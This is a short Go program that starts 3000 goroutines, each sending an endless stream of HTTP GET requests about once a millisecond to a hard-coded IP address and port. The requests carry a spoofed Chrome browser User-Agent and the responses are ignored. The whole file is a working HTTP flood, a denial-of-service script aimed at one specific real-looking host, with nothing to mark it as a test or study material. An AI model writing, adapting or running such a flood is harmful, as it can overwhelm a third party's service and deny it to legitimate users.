package main

import (
	"fmt"
	"net/http"
	"time"
)

func main() {
	// Create a new integer channel
	intChan := make(chan int)

	Send2(0)
	for i := 0; i < 3000; i++ {
		fmt.Printf("i: %v\n", i)

		go func() {
			for {

				Send2(0)

				time.Sleep(1*time.Millisecond)

			}
		}()
	} 

	<-intChan

}

func Send2(ij int) {

	client := &http.Client{}
	req, err := http.NewRequest("GET", "http://156.253.5.224:4173/", nil)
	if err != nil {
		fmt.Printf("err: %v\n", err)

	}
	req.Header.Set("Accept", "application/json, text/plain, */*")
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	  client.Do(req)
	 

}
